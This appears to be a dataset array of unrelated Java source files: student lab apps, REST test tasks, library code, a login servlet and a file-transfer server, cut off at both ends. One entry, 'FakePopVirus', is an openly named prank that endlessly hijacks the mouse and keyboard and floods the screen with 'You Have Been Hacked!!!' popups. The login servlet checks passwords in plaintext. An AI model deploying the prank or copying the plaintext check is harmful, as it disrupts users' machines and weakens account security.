writer.close();\n\n            System.out.println(\"Line \" + lineNumber + \" edited successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String ReadLine(String filePath, int lineNumber) {\n        String line = new String(\"\");\n        try {\n            // Open the file\n            BufferedReader reader = new BufferedReader(new FileReader(filePath));\n\n            // Read lines until reaching the target line number\n\n            int currentLineNumber = 1;\n            while ((line = reader.readLine()) != null && currentLineNumber <= lineNumber) {\n                if (currentLineNumber == lineNumber) {\n                    // Process the line here\n                    System.out.println(line);\n                    break; // Once the target line is read, exit the loop\n                }\n                currentLineNumber++;\n            }\n\n            // Close the file\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        finally {\n            return line;\n        }\n\n    }\n}\n",
    "package edu.miu.cs.cs489appsd;\n\nimport edu.miu.cs.cs489appsd.model.Product;\n\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.Comparator;\nimport java.util.List;\n\npublic class ProductMgmtApp {\n    private static void printJSONFormat(List<Product> products){\n\n        System.out.println(\"Printed in JSON Format\");\n        System.out.println(\"[\");\n        for (Product product : products) {\n            System.out.println(\"{ \\\"productId\\\":\"+product.getProductId()+\", \\\"name\\\":\"+product.getName()+\", \\\"dateSupplied\\\":\"+product.getDateSupplied()+\", \\\"quantityInStock\\\":\"+product.getQuantityInStock()+\", \\\"unitPrice\\\":\"+product.getUnitPrice()+\"  },\");\n        }\n        System.out.println(\"]\");\n    }\n\n    private static void printXMLFormat(List<Product> products){\n        System.out.println(\"Print XML Format\");\n        System.out.println(\"<?xml version=\\\"1.0\\\"\");\n        System.out.println(\"<products>\");\n        for (Product product : products) {\n            System.out.println(\"<product productId=\\\"\"+product.getProductId()+\"\\\" name=\\\"\"+product.getName()+\"\\\" dateSupplied=\\\"\"+product.getDateSupplied()+\"\\\" quantityInStock=\\\"\"+product.getQuantityInStock()+\"\\\" unitPrice=\\\"\"+product.getUnitPrice()+\"\\\"/>\");\n        }\n        System.out.println(\"</products>\");\n    }\n\n    private static void printCSVFormat(List<Product> products){\n        System.out.println(\"Print Comma-Seperated Value - CSV Format\");\n        for (Product product : products) {\n            System.out.println(product.getProductId()+\", \"+product.getName()+\", \"+product.getDateSupplied()+\", \"+product.getQuantityInStock()+\", \"+product.getUnitPrice());\n        }\n    }\n    public static void main(String args[]){\n        List<Product> products = new ArrayList<Product>();\n        products.add(new Product(3128874119L, \"Banana\", \"2023-01-24\", 124, 0.55 ));\n        products.add(new Product(2927458265L, \"Apple\", \"2023-12-09\", 18, 1.09 ));\n        products.add(new Product(9189927460L, \"Carrot\", \"2023-03-31\", 89, 2.99 ));\n\n        Collections.sort(products, new Comparator<Product>(){\n            @Override\n            public int compare(Product o1, Product o2) {\n                return o1.getName().compareTo(o2.getName());\n            }\n        });\n        printJSONFormat(products);\n        System.out.println(\"------------------------------------\");\n        printXMLFormat(products);\n        System.out.println(\"------------------------------------\");\n        printCSVFormat(products);\n    }\n}\n",
    "\npackage masummsi.basicjava;\n\nimport java.util.Scanner;\n\npublic class PracticeLastWeek {\n   \n    public static void main(String[] args) {\n        Scanner num1 = new Scanner(System.in);\n        \n        \n        float x , y ;\n             \n        \n        System.out.print(\"Enter Value of X :  \");\n               x = num1.nextInt();\n        System.out.print(\"Enter Value of Y :  \");\n               y = num1.nextInt();\n               \n               float result = x+y;\n               float res2 = x-y;\n               float res3 = x/y;\n               float res4 = x%y;\n               float res5 = x*y;\n               float res6 = x*y+y+y-x*y+6+45-99*4+7+y+x-y/5/2/2+45*x+res2*result;\n               \n               \n               \n               \n               \n               \n       System.out.printf(\"Addition Result : %.0f\\n\",result);\n       \n       System.out.printf(\"Subtraction Result : %.0f\\n\",res2);\n       \n       System.out.printf(\"Division Result : %.2f\\n\",res3);\n       \n       System.out.printf(\"Modulus Result : %.2f\\n\",res4);\n       \n       System.out.printf(\"Multiplication Result : %.2f\\n\",res5);\n       \n       System.out.printf(\"Equation  Result : %.3f\\n\",res6);\n       \n        \n    }\n}\n",
    "package edu.miu.cs.cs489appsd.lab1a.productmgmtapp;\n\nimport edu.miu.cs.cs489appsd.lab1a.productmgmtapp.model.Product;\n\nimport java.time.LocalDate;\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Hello world!\n *\n */\npublic class ProductMgmtApp {\n\n    public static void main( String[] args ) {\n        List<Product> productList = new ArrayList<>();\n        productList.add(new Product(3128874119L, \"Banana\", LocalDate.of(2023, 12, 9), 124, 0.55));\n        productList.add(new Product(2927458265L, \"Apple\", LocalDate.of(2023, 1, 24), 18, 1.09));\n        productList.add(new Product(9189927460L, \"Carrot\", LocalDate.of(2023, 3, 31), 89, 2.99));\n\n        System.out.println(\"Printed in JSON Format\");\n        printProducts(productList);\n\n        System.out.println(\"------------------------------\");\n        System.out.println(\"Printed in XML Format\");\n        xmlFormat(productList);\n        System.out.println();\n\n        System.out.println(\"------------------------------\");\n        System.out.println(\"Printed in Comma-Separated Value (CSV) Format\");\n        csvFormat(productList);\n    }\n\n    private static void printProducts(List<Product> listOfProducts) {\n        jsonFormat(listOfProducts);\n    }\n\n    private static void jsonFormat(List<Product> list) {\n        StringBuilder jsonSb = new StringBuilder(\"[\");\n        jsonSb.append(\"\\n\");\n        for(Product product: list) {\n            jsonSb.append(\"   \" );\n            jsonSb.append(\"\\\"productId\\\":\"); jsonSb.append(product.getProductId()); jsonSb.append(\", \");\n            jsonSb.append(\"\\\"name\\\":\"); jsonSb.append(product.getName()); jsonSb.append(\", \");\n            jsonSb.append(\"\\\"dateSupplied\\\":\"); jsonSb.append(product.getDateSupplied()); jsonSb.append(\", \");\n            jsonSb.append(\"\\\"quantityInStock\\\":\"); jsonSb.append(product.getQuantityInStock()); jsonSb.append(\", \");\n            jsonSb.append(\"\\\"unitPrice\\\":\"); jsonSb.append(product.getUnitPrice()); jsonSb.append(\", \");\n            jsonSb.append(\"\\n\");\n        }\n        jsonSb.append(\"]\");\n\n        System.out.println(jsonSb);\n    }\n\n    private static void xmlFormat(List<Product> list) {\n        StringBuilder xmlsb = new StringBuilder(\"<?xml version\\\"=\\\"?>\"); xmlsb.append(\"\\n\");\n        xmlsb.append(\"<products>\"); xmlsb.append(\"\\n\");\n        for(Product product: list) {\n            xmlsb.append(\"   <product \"); xmlsb.append(\"productId=\\\"\"); xmlsb.append(product.getProductId()); xmlsb.append(\"\\\"\");\n            xmlsb.append(\" \"); xmlsb.append(\"name=\\\"\"); xmlsb.append(product.getName()); xmlsb.append(\"\\\"\");\n            xmlsb.append(\" \"); xmlsb.append(\"dateSupplied=\\\"\"); xmlsb.append(product.getDateSupplied()); xmlsb.append(\"\\\"\");\n            xmlsb.append(\" \"); xmlsb.append(\"quantityInStock=\\\"\"); xmlsb.append(product.getQuantityInStock()); xmlsb.append(\"\\\"\");\n            xmlsb.append(\" \"); xmlsb.append(\"unitPrice=\\\"\"); xmlsb.append(product.getUnitPrice()); xmlsb.append(\"\\\"\");\n            xmlsb.append(\"/>\");\n            xmlsb.append(\"\\n\");\n        }\n        xmlsb.append(\"</products>\");\n\n        System.out.println(xmlsb);\n\n    }\n\n    private static void csvFormat(List<Product> list) {\n        StringBuilder csvsb = new StringBuilder();\n        for (Product product: list) {\n            csvsb.append(product.getProductId()); csvsb.append(\", \");\n            csvsb.append(product.getName()); csvsb.append(\", \");\n            csvsb.append(product.getDateSupplied()); csvsb.append(\", \");\n            csvsb.append(product.getQuantityInStock()); csvsb.append(\", \");\n            csvsb.append(product.getUnitPrice()); csvsb.append(\", \");\n            csvsb.append(\"\\n\");\n        }\n\n        System.out.println(csvsb);\n    }\n}\n",
    "package com.pe.screenplaybdd.tasks;\n\nimport com.pe.screenplaybdd.model.User;\nimport io.restassured.http.ContentType;\nimport net.serenitybdd.rest.SerenityRest;\nimport net.serenitybdd.screenplay.Actor;\nimport net.serenitybdd.screenplay.Performable;\nimport net.serenitybdd.screenplay.Task;\nimport net.serenitybdd.screenplay.rest.interactions.Put;\n\nimport static com.pe.screenplaybdd.endpoints.UserBDDEndpoints.*;\nimport static net.serenitybdd.screenplay.Tasks.instrumented;\n\npublic class UpdateUser implements Task {\n    private final User user;\n    private String userUpdate;\n\n    public UpdateUser(User user, String userUpdate) {\n        this.user = user;\n        this.userUpdate = userUpdate;\n    }\n\n    public static Performable as(User user, String userUpdate) {\n        return instrumented(UpdateUser.class, user, userUpdate);\n    }\n\n    @Override\n    public <T extends Actor> void performAs(T actor) {\n        actor.attemptsTo(Put.to(Actualizar_User.getPath()).with(request -> request.given().log().all()\n                .contentType(ContentType.JSON).pathParam(\"username\", userUpdate)\n                .body(user)));\n        if (SerenityRest.lastResponse().statusCode() == 200) {\n            SerenityRest.then().log().all();\n            actor.remember(\"username\", user.getUsername());\n        }\n    }\n}\n",
    "\r\npackage fakepopvirus;\r\n\r\nimport java.awt.AWTException;\r\nimport java.awt.Dimension;\r\nimport java.awt.Robot;\r\nimport java.awt.Toolkit;\r\nimport java.awt.event.KeyEvent;\r\nimport java.util.Random;\r\nimport javax.swing.JLabel;\r\nimport javax.swing.JWindow;\r\n\r\n\r\npublic class FakePopVirus {\r\n    \r\n    private final  Random rd = new Random();\r\n    private final  Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();\r\n    private final int width = (int) screenSize.getWidth();\r\n    private final int height = (int) screenSize.getHeight();\r\n    \r\n    \r\n    \r\n    public void BlockKeyandMouse() throws AWTException\r\n    {\r\n        Robot rb = new Robot();\r\n        rb.keyPress(KeyEvent.VK_0); \r\n        rb.mouseMove(rd.nextInt(width),rd.nextInt(height));\r\n\r\n    }\r\n    \r\n    public void Popup()\r\n    {\r\n        JWindow win = new JWindow();\r\n        JLabel label = new JLabel(\"You Have Been Hacked!!!\",JLabel.CENTER);\r\n        win.add(label);\r\n        win.setSize(200, 75);\r\n        win.setLocation(rd.nextInt(width), rd.nextInt(height));\r\n        win.setVisible(true);\r\n    \r\n    }\r\n    \r\n    \r\n    \r\n    \r\n    \r\n    public static void main(String[] args) throws AWTException, InterruptedException {\r\n        FakePopVirus fv = new FakePopVirus();\r\n        while(true)\r\n        {\r\n            fv.BlockKeyandMouse();\r\n            fv.Popup();\r\n        }\r\n        \r\n        \r\n    }\r\n    \r\n}\r\n",
    "\nimport javax.swing.JOptionPane;\nimport javax.swing.table.DefaultTableModel;\n\n/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\n/**\n *\n * @author Ferrando Carlos\n */\npublic class ProductoView extends javax.swing.JFrame {\n\n    //tabla \n    private DefaultTableModel modelo = new DefaultTableModel();\n\n    /**\n     * Creates new form ProductoView\n     */\n    public ProductoView() {\n        initComponents();\n        armarCabecera();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form. WARNING: Do NOT modify this code. The content of this method is always regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jpProductoSelect = new javax.swing.JPanel();\n        jlTitulo = new javax.swing.JLabel();\n        jlCategoria = new javax.swing.JLabel();\n        jcbCategorias = new javax.swing.JComboBox<>();\n        jlDatos = new javax.swing.JLabel();\n        jlDatos1 = new javax.swing.JLabel();\n        jlDatos2 = new javax.swing.JLabel();\n        jtfNombre = new javax.swing.JTextField();\n        jtfPrecio = new javax.swing.JTextField();\n        jbtnAgregar = new javax.swing.JButton();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jtProductos = new javax.swing.JTable();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());\n\n        jpProductoSelect.setBackground(new java.awt.Color(7, 10, 222));\n        jpProductoSelect.setToolTipText(\"\");\n\n        jlTitulo.setFont(new java.awt.Font(\"Arial\", 0, 36)); // NOI18N\n        jlTitulo.setForeground(new java.awt.Color(255, 255, 255));\n        jlTitulo.setText(\"Sistema de Productos\");\n\n        jlCategoria.setFont(new java.awt.Font(\"Arial\", 0, 18)); // NOI18N\n        jlCategoria.setForeground(new java.awt.Color(255, 255, 255));\n        jlCategoria.setText(\"CATEGORIA\");\n\n        jcbCategorias.setBackground(new java.awt.Color(51, 51, 255));\n        jcbCategorias.setFont(new java.awt.Font(\"Arial\", 0, 14)); // NOI18N\n        jcbCategorias.setForeground(new java.awt.Color(0, 0, 0));\n        jcbCategorias.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { \"Electr\u00f3nica\", \"Alimentos\", \"Videojuegos\", \"Indumentaria\" }));\n        jcbCategorias.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(168, 64, 15), 2, true));\n\n        jlDatos.setFont(new java.awt.Font(\"Arial\", 0, 18)); // NOI18N\n        jlDatos.setForeground(new java.awt.Color(255, 255, 255));\n        jlDatos.setText(\"DATOS DEL PRODUCTO\");\n\n        jlDatos1.setFont(new java.awt.Font(\"Arial\", 0, 14)); // NOI18N\n        jlDatos1.setForeground(new java.awt.Color(255, 255, 255));\n        jlDatos1.setText(\"NOMBRE\");\n\n        jlDatos2.setFont(new java.awt.Font(\"Arial\", 0, 14)); // NOI18N\n        jlDatos2.setForeground(new java.awt.Color(255, 255, 255));\n        jlDatos2.setText(\"PRECIO\");\n\n        jtfNombre.setFont(new java.awt.Font(\"Arial\", 0, 14)); // NOI18N\n        jtfNombre.setForeground(new java.awt.Color(0, 0, 0));\n        jtfNombre.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(168, 64, 15), 2));\n\n        jtfPrecio.setFont(new java.awt.Font(\"Arial\", 0, 14)); // NOI18N\n        jtfPrecio.setForeground(new java.awt.Color(0, 0, 0));\n        jtfPrecio.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(168, 64, 15), 2));\n\n        jbtnAgregar.setBackground(new java.awt.Color(168, 64, 15));\n        jbtnAgregar.setFont(new java.awt.Font(\"Arial\", 0, 18)); // NOI18N\n        jbtnAgregar.setForeground(new java.awt.Color(255, 255, 255));\n        jbtnAgregar.setText(\"AGREGAR PRODUCTO\");\n        jbtnAgregar.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jbtnAgregarActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout jpProductoSelectLayout = new javax.swing.GroupLayout(jpProductoSelect);\n        jpProductoSelect.setLayout(jpProductoSelectLayout);\n        jpProductoSelectLayout.setHorizontalGroup(\n            jpProductoSelectLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jpProductoSelectLayout.createSequentialGroup()\n                .addGap(22, 22, 22)\n                .addGroup(jpProductoSelectLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                    .addComponent(jlDatos2)\n                    .addComponent(jlTitulo, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                    .addComponent(jlCategoria)\n                    .addComponent(jcbCategorias, 0, jav",
    "/*\n * Copyright 2017-present Open Networking Foundation\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.onosproject.drivers.lisp.extensions;\n\nimport com.google.common.collect.ImmutableList;\nimport com.google.common.collect.Maps;\nimport org.onlab.util.KryoNamespace;\nimport org.onosproject.mapping.addresses.ASMappingAddress;\nimport org.onosproject.mapping.addresses.DNMappingAddress;\nimport org.onosproject.mapping.addresses.EthMappingAddress;\nimport org.onosproject.mapping.addresses.ExtensionMappingAddress;\nimport org.onosproject.mapping.addresses.ExtensionMappingAddressType;\nimport org.onosproject.mapping.addresses.IPMappingAddress;\nimport org.onosproject.mapping.addresses.MappingAddress;\nimport org.onosproject.net.flow.AbstractExtension;\nimport org.onosproject.store.serializers.KryoNamespaces;\n\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\n\nimport static com.google.common.base.MoreObjects.toStringHelper;\nimport static org.onosproject.mapping.addresses.ExtensionMappingAddressType\n                    .ExtensionMappingAddressTypes.TRAFFIC_ENGINEERING_ADDRESS;\n\n/**\n * Implementation of LISP traffic engineering address.\n * For a given EID lookup into the mapping database, this LCAF can be returned\n * to provide a list of locators in an explicit re-encapsulation path.\n */\npublic final class LispTeAddress extends AbstractExtension\n                                            implements ExtensionMappingAddress {\n\n    private static final String TE_RECORDS = \"records\";\n\n    private List<TeRecord> records;\n\n    private KryoNamespace appKryo = new KryoNamespace.Builder()\n                                            .register(KryoNamespaces.API)\n                                            .register(MappingAddress.class)\n                                            .register(MappingAddress.Type.class)\n                                            .register(IPMappingAddress.class)\n                                            .register(ASMappingAddress.class)\n                                            .register(DNMappingAddress.class)\n                                            .register(EthMappingAddress.class)\n                                            .register(TeRecord.class)\n                                            .build();\n\n    /**\n     * Default constructor.\n     */\n    public LispTeAddress() {\n    }\n\n    /**\n     * Creates an instance with initialized parameters.\n     *\n     * @param records a collection of TE records\n     */\n    private LispTeAddress(List<TeRecord> records) {\n        this.records = records;\n    }\n\n    /**\n     * Obtains a collection of TE records.\n     *\n     * @return a collection of TE records\n     */\n    public List<TeRecord> getTeRecords() {\n        return ImmutableList.copyOf(records);\n    }\n\n    @Override\n    public ExtensionMappingAddressType type() {\n        return TRAFFIC_ENGINEERING_ADDRESS.type();\n    }\n\n    @Override\n    public byte[] serialize() {\n        Map<String, Object> parameterMap = Maps.newHashMap();\n\n        parameterMap.put(TE_RECORDS, records);\n        return appKryo.serialize(parameterMap);\n    }\n\n    @Override\n    public void deserialize(byte[] data) {\n        Map<String, Object> parameterMap = appKryo.deserialize(data);\n\n        this.records = (List<TeRecord>) parameterMap.get(TE_RECORDS);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(records);\n    }\n\n    @Override\n    public boolean equals(Object obj) {\n        if (this == obj) {\n            return true;\n        }\n\n        if (obj instanceof LispTeAddress) {\n            final LispTeAddress other = (LispTeAddress) obj;\n            return Objects.equals(records, other.records);\n        }\n        return false;\n    }\n\n    @Override\n    public String toString() {\n        return toStringHelper(type().toString())\n                .add(\"TE records\", records).toString();\n    }\n\n    /**\n     * A builder for building LispTeAddress.\n     */\n    public static final class Builder {\n        private List<TeRecord> records;\n\n        /**\n         * Sets a collection of TE records.\n         *\n         * @param records a collection of TE records\n         * @return Builder object\n         */\n        public Builder withTeRecords(List<TeRecord> records) {\n            this.records = records;\n            return this;\n        }\n\n        /**\n         * Builds LispTeAddress instance.\n         *\n         * @return LispTeAddress instance\n         */\n        public LispTeAddress ",
    "/*\n * Copyright (c) 2019, 2023, Oracle and/or its affiliates.\n *\n * This program is free software; you can redistribute it and/or modify it under\n * the terms of the GNU General Public License, version 2.0, as published by the\n * Free Software Foundation.\n *\n * This program is also distributed with certain software (including but not\n * limited to OpenSSL) that is licensed under separate terms, as designated in a\n * particular file or component or in included license documentation. The\n * authors of MySQL hereby grant you an additional permission to link the\n * program and your derivative works with the separately licensed software that\n * they have included with MySQL.\n *\n * Without limiting anything contained in the foregoing, this file, which is\n * part of MySQL Connector/J, is also subject to the Universal FOSS Exception,\n * version 1.0, a copy of which can be found at\n * http://oss.oracle.com/licenses/universal-foss-exception.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS\n * FOR A PARTICULAR PURPOSE. See the GNU General Public License, version 2.0,\n * for more details.\n *\n * You should have received a copy of the GNU General Public License along with\n * this program; if not, write to the Free Software Foundation, Inc.,\n * 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA\n */\n\npackage com.mysql.cj.util;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.Random;\nimport java.util.stream.Collectors;\n\nimport javax.naming.Context;\nimport javax.naming.NamingException;\nimport javax.naming.directory.Attribute;\nimport javax.naming.directory.Attributes;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\n\npublic class DnsSrv {\n\n    public static class SrvRecord implements Comparable<SrvRecord> {\n\n        private final int priority;\n        private final int weight;\n        private final int port;\n        private final String target;\n\n        public static SrvRecord buildFrom(String srvLine) {\n            String[] srvParts = srvLine.split(\"\\\\s+\");\n            if (srvParts.length == 4) {\n                int priority = Integer.parseInt(srvParts[0]);\n                int weight = Integer.parseInt(srvParts[1]);\n                int port = Integer.parseInt(srvParts[2]);\n                String target = srvParts[3].replaceFirst(\"\\\\.$\", \"\");\n                return new SrvRecord(priority, weight, port, target);\n            }\n            return null;\n        }\n\n        public SrvRecord(int priority, int weight, int port, String target) {\n            this.priority = priority;\n            this.weight = weight;\n            this.port = port;\n            this.target = target;\n        }\n\n        public int getPriority() {\n            return this.priority;\n        }\n\n        public int getWeight() {\n            return this.weight;\n        }\n\n        public int getPort() {\n            return this.port;\n        }\n\n        public String getTarget() {\n            return this.target;\n        }\n\n        @Override\n        public String toString() {\n            return String.format(\"{\\\"Priority\\\": %d, \\\"Weight\\\": %d, \\\"Port\\\": %d, \\\"Target\\\": \\\"%s\\\"}\", getPriority(), getWeight(), getPort(), getTarget());\n        }\n\n        @Override\n        public int compareTo(SrvRecord o) {\n            int priorityDiff = getPriority() - o.getPriority();\n            return priorityDiff == 0 ? getWeight() - o.getWeight() : priorityDiff;\n        }\n\n    }\n\n    public static List<SrvRecord> lookupSrvRecords(String serviceName) throws NamingException {\n        List<SrvRecord> srvRecords = new ArrayList<>();\n\n        Properties environment = new Properties();\n        environment.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.dns.DnsContextFactory\");\n        DirContext context = new InitialDirContext(environment);\n        Attributes dnsEntries = context.getAttributes(serviceName, new String[] { \"SRV\" });\n        if (dnsEntries != null) {\n            Attribute hosts = dnsEntries.get(\"SRV\");\n            if (hosts != null) {\n                for (int i = 0; i < hosts.size(); i++) {\n                    srvRecords.add(SrvRecord.buildFrom((String) hosts.get(i)));\n                }\n            }\n        }\n\n        return sortSrvRecords(srvRecords);\n    }\n\n    /**\n     * Sort a list of DNS SRV records according to the sorting rules described in rfc2782.\n     *\n     * @param srvRecords\n     *            the list of {@link SrvRecord}s to sort.\n     * @return\n     *         a new list of sorted {@link SrvRecord}s.\n     */\n    public static List<SrvRecord> sortSrvRecords(List<SrvRecord> srvRecords) {\n        // Sort srv records by their natural order, i.e., first by priority then by weight.\n        List<SrvRecord> srvRecordsSortedNatural = srvRecords.stream().sorted().collect(Collectors.toList());\n\n        // Sort records with equal priority by weight using a categor",
    "package edu.miu.cs.cs489apsd.lab1a.productmgmtapp.model;\n\nimport java.time.LocalDate;\n\npublic class Product {\n    private Long productId;\n    private String name;\n    private LocalDate dateSupplied;\n    private Integer quantityInStock;\n    private Double unitPrice;\n\n    // All args constructor\n    public Product(Long productId, String name, LocalDate dateSupplied, Integer quantityInStock, Double unitPrice) {\n        this.productId = productId;\n        this.name = name;\n        this.dateSupplied = dateSupplied;\n        this.quantityInStock = quantityInStock;\n        this.unitPrice = unitPrice;\n\n    }\n\n    // No args constructor\n    public Product() {\n        this(null, null, null, null, null);\n    }\n\n    public Product(String name) {\n        this(null, name, null, null, null);\n\n    }\n\n    public Long getProductId() {\n        return productId;\n    }\n\n    public void setProductId(Long productId) {\n        this.productId = productId;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public LocalDate getDateSupplied() {\n        return dateSupplied;\n    }\n\n    public void setDateSupplied(LocalDate dateSupplied) {\n        this.dateSupplied = dateSupplied;\n    }\n\n    public Integer getQuantityInStock() {\n        return quantityInStock;\n    }\n\n    public void setQuantityInStock(Integer quantityInStock) {\n        this.quantityInStock = quantityInStock;\n    }\n\n    public Double getUnitPrice() {\n        return unitPrice;\n    }\n\n    public void setUnitPrice(Double unitPrice) {\n        this.unitPrice = unitPrice;\n    }\n\n    @Override\n    public String toString() {\n        return STR.\"\\{productId} \\{name} \\{dateSupplied} \\{quantityInStock} \\{unitPrice}\";\n        // return \"Product [productId=\" + productId + \", name=\" + name + \",\n        // dateSupplied=\" + dateSupplied\n        // + \", quantityInStock=\" + quantityInStock + \", unitPrice=\" + unitPrice + \"]\";\n    }\n\n}\n",
    "package controller;\n\nimport java.io.IOException;\nimport java.sql.SQLException;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport dao.Dao;\nimport dto.User;\n@WebServlet(\"/userlogin\")\npublic class login extends HttpServlet{\n\t\n\t@Override\n\tprotected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n\t\tString email = req.getParameter(\"email\");\n\t\tString password = req.getParameter(\"password\");\n\t\t\n\t\tDao dao = new Dao();\n\t\t\n\t\ttry {\n\t\t\tUser u = dao.findByEmail(email);\n\t\t\tif(u!=null) {\n\t\t\t\t//verify the password\n\t\t\t\tif(u.getUserpassword().equals(password)) {\n\t\t\t\t\t//login success\n\t\t\t\t\treq.setAttribute(\"user\", u);\n\t\t\t\t\treq.getRequestDispatcher(\"home.jsp\").include(req, resp);\n\t\t\t\t}else {\n\t\t\t\t\t//password wrong\n\t\t\t\t\treq.setAttribute(\"message\", \"password wrong\");\n\t\t\t\t\treq.getRequestDispatcher(\"login.jsp\").include(req, resp);\n\t\t\t\t}\n\t\t\t}else {\n\t\t\t\t// email is wrong\n\t\t\t\treq.setAttribute(\"message\", \"wrong email\");\n\t\t\t\treq.getRequestDispatcher(\"login.jsp\").include(req, resp);\n\t\t\t}\n\t\t\t\n\t\t} catch (ClassNotFoundException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t} catch (SQLException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\n\t}\n\t\n}",
    "package com.laba.UserService.service;\nimport com.laba.UserService.dto.UserInfoResponseDto;\nimport com.laba.UserService.dto.UserSaveRequestDto;\nimport com.laba.UserService.entity.Users;\nimport com.laba.UserService.exception.GeneralException;\nimport com.laba.UserService.mapper.UserMapper;\nimport com.laba.UserService.repository.UserRepository;\nimport org.springframework.stereotype.Service;\n\nimport java.util.Optional;\n\n@Service\npublic class UserService {\n\n    private final UserRepository userRepository;\n    private final UserMapper userMapper;\n\n    public UserService(UserRepository userRepository, UserMapper userMapper) {\n        this.userRepository = userRepository;\n        this.userMapper = userMapper;\n    }\n\n\n    public void save(UserSaveRequestDto userSaveRequestDto){\n        Users users = userMapper.userSaveRequestDtoToUser(userSaveRequestDto);\n        userRepository.save(users);\n\n    }\n\n    public UserInfoResponseDto info(Long userId){\n        Optional<Users> optionalUsers = userRepository.findById(userId);\n        Users users = optionalUsers.orElseThrow(GeneralException::new);\n        return userMapper.userToInfoResponseDto(users);\n\n    }\n\n    public Optional<Users> findUserById(Long id){\n        return userRepository.findById(id);\n    }\n\n}\n",
    "package FinalProject;\n\nimport java.awt.BorderLayout;\nimport java.awt.EventQueue;\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport javax.swing.JFrame;\nimport javax.swing.JOptionPane;\nimport javax.swing.JPanel;\nimport javax.swing.border.EmptyBorder;\n\nimport SourceFile.FileInfo;\n\nimport javax.swing.JTextField;\nimport javax.swing.JButton;\nimport javax.swing.JComponent;\nimport java.awt.Color;\nimport java.awt.Font;\nimport java.awt.TextArea;\nimport java.awt.event.ActionListener;\nimport java.awt.event.ActionEvent;\nimport javax.swing.JLabel;\nimport java.awt.Toolkit;\nimport javax.swing.ImageIcon;\n\n\npublic class Server extends JFrame    {\n\n\tprivate JPanel contentPane;\n\tprivate JTextField msg_text;\n\tprivate TextArea msg_area;\n\tprivate JLabel lblNewLabel;\n\tprivate JLabel lblPort;\n\n\tstatic ServerSocket serverSocket;\n\tstatic Socket socket,socket1;\n\tstatic DataInputStream dataIn;\n\tstatic DataOutputStream dataOut;\n\tprivate static JComponent fame = null;\n\t\n\tpublic static ArrayList<Socket> listSK;\n\t/**\n\t * Launch the application.\n\t */\n\tpublic static void main(String[] args) {\n\t\tEventQueue.invokeLater(new Runnable() {\n\t\t\tpublic void run() {\n\t\t\t\ttry {\n\t\t\t\t\tserverSocket = new ServerSocket(49);\n\t\t\t\t\tJOptionPane.showMessageDialog(fame, \"Server is created on port 49.\", \"Note\", JOptionPane.WARNING_MESSAGE);\n\t\t\t\t\tServer frame = new Server();\n\t\t\t\t\tframe.setVisible(true);\n\t\t\t\t\tServer.listSK = new ArrayList<>();\n\t\t\t\t\tframe.execute();\n\t\t\t\t\t\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t});\n\t}\n\tprivate void execute() throws IOException{\n\t\tWaitingClient waiting = new WaitingClient();\n\t\twaiting.start();\n\t\tWaitingFile wF = new WaitingFile();\n\t\twF.start();\n\t}\n\t\n\tprivate boolean createFile(FileInfo fileInfo) {\n        BufferedOutputStream bos = null;\n         \n        try {\n            if (fileInfo != null) {\n                File fileReceive = new File(fileInfo.getDestinationDirectory() \n                        + fileInfo.getFilename());\n              